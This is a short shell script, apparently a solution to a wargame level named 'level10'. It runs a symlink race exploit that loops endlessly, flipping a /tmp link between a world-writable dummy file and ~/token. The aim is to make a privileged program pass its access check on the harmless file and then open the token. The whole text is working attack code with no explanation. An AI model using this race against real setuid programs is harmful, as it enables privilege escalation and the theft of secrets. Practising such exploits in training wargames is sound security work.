touch /tmp/my_file
chmod 777 /tmp/my_file
while [ 1 ]
do
  ln -fs /tmp/my_file /tmp/level10_link
  ln -fs ~/token /tmp/level10_link
done